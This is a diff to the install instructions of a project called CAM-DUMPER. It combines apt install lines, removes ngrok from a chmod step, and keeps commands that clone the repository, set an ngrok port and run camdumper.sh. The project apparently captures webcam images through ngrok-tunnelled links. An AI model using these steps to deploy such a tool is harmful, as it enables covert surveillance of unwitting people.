@@ -14,11 +14,10 @@
 
 ```
 $ apt update && apt upgrade
-$ apt install git
-$ apt install php wget curl jq
+$ apt install git php wget curl jq
 $ git clone https://github.com/LiNuX-Mallu/CAM-DUMPER.git
 $ cd CAM-DUMPER
-$ chmod +x camdumper.sh ngrok
+$ chmod +x camdumper.sh
 $ echo "web_addr: 4045" >> $HOME/.ngrok2/ngrok.yml
 $ ./camdumper.sh
 ```
